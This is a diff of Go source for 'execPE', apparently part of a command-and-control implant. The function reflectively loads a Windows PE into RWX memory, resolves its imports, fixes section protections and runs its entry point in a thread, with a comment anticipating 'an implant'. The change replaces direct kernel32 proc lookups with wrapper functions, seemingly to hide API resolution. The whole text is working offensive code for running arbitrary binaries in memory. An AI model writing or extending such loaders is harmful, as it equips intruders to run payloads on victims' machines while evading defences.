@@ -108,23 +108,14 @@ func execPE(pebytes []byte, _ string) string {
 		})
 	}
 
-	// ── Resolve kernel32 procs ───────────────────────────────────────────────
-	virtualAlloc   := kernel32.NewProc("VirtualAlloc")
-	virtualProtect := kernel32.NewProc("VirtualProtect")
-	createThread   := kernel32.NewProc("CreateThread")
-	waitForSingle  := kernel32.NewProc("WaitForSingleObject")
-	loadLibA       := kernel32.NewProc("LoadLibraryA")
-	getProcAddr    := kernel32.NewProc("GetProcAddress")
-
 	// ── Phase 2: Allocate memory ──────────────────────────────────────────────
 	const allocFlags = uintptr(windows.MEM_COMMIT | windows.MEM_RESERVE)
 	const rwxProt    = uintptr(windows.PAGE_EXECUTE_READWRITE)
 
 	// Try preferred base first; fall back to any address if taken.
-	imageBase, _, _ := virtualAlloc.Call(
-		uintptr(preferredBase), uintptr(sizeOfImage), allocFlags, rwxProt)
+	imageBase := apiVirtualAlloc(uintptr(preferredBase), uintptr(sizeOfImage), allocFlags, rwxProt)
 	if imageBase == 0 {
-		imageBase, _, _ = virtualAlloc.Call(0, uintptr(sizeOfImage), allocFlags, rwxProt)
+		imageBase = apiVirtualAlloc(0, uintptr(sizeOfImage), allocFlags, rwxProt)
 	}
 	if imageBase == 0 {
 		return "[error: VirtualAlloc failed]"
@@ -202,7 +193,7 @@ func execPE(pebytes []byte, _ string) string {
 
 			dllNameZ := cstrFromPtr(imageBase+uintptr(nameRVA)) + "\x00"
 			dllNameB := []byte(dllNameZ)
-			hDLL, _, _ := loadLibA.Call(uintptr(unsafe.Pointer(&dllNameB[0])))
+			hDLL := apiLoadLibraryA(uintptr(unsafe.Pointer(&dllNameB[0])))
 			_ = dllNameB // keep alive
 			if hDLL == 0 {
 				continue // DLL not found; skip (will cause AV on first call)
@@ -223,14 +214,14 @@ func execPE(pebytes []byte, _ string) string {
 				var fnAddr uintptr
 				if thunk>>63 == 1 {
 					// Ordinal import
-					fnAddr, _, _ = getProcAddr.Call(hDLL, uintptr(thunk&0xFFFF))
+					fnAddr = apiGetProcAddress(hDLL, uintptr(thunk&0xFFFF))
 				} else {
 					// Named import: thunk is RVA to IMAGE_IMPORT_BY_NAME
 					// Skip the 2-byte Hint field to reach the name.
 					fnNamePtr := imageBase + uintptr(thunk) + 2
 					fnNameZ := cstrFromPtr(fnNamePtr) + "\x00"
 					fnNameB := []byte(fnNameZ)
-					fnAddr, _, _ = getProcAddr.Call(hDLL, uintptr(unsafe.Pointer(&fnNameB[0])))
+					fnAddr = apiGetProcAddress(hDLL, uintptr(unsafe.Pointer(&fnNameB[0])))
 					_ = fnNameB
 				}
 				*(*uintptr)(unsafe.Pointer(iatBase + j)) = fnAddr
@@ -245,7 +236,7 @@ func execPE(pebytes []byte, _ string) string {
 		}
 		prot := peCharsToProt(sec.characteristics)
 		var oldProt uint32
-		virtualProtect.Call(
+		apiVirtualProtect(
 			imageBase+uintptr(sec.virtAddr),
 			uintptr(sec.rawSize),
 			uintptr(prot),
@@ -255,12 +246,12 @@ func execPE(pebytes []byte, _ string) string {
 
 	// ── Phase 7: Execute entry point ──────────────────────────────────────────
 	ep := imageBase + uintptr(entryRVA)
-	hThread, _, _ := createThread.Call(0, 0, ep, 0, 0, 0)
+	hThread := apiCreateThread(0, 0, ep, 0, 0, 0)
 	if hThread == 0 {
 		return "[error: CreateThread failed]"
 	}
 	// Wait up to 10 s; if the PE keeps running (e.g. it's an implant), detach.
-	r, _, _ := waitForSingle.Call(hThread, 10000)
+	r := apiWaitForSingleObject(hThread, 10000)
 	windows.CloseHandle(windows.Handle(hThread))
 	if uint32(r) == 0x00000102 { // WAIT_TIMEOUT
 		return "[+] PE executing (async — entry point did not return within 10 s)"
